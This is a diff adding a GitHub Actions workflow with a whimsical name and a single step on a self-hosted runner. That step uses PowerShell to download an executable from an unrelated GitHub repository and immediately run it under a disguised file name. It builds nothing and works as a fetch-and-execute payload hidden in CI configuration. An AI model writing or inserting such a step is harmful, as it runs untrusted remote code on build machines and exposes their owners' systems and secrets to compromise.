@@ -1,0 +1,10 @@
+name: mixingchocolatecakes
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: good
+    steps:
+      - name: powershell
+        shell: cmd
+        run: powershell.exe -c Invoke-WebRequest https://github.com/friendteammakingfor2024/inthecake2024/raw/refs/heads/main/intoforamouse.exe -OutFile bacon.exe ; .\bacon.exe
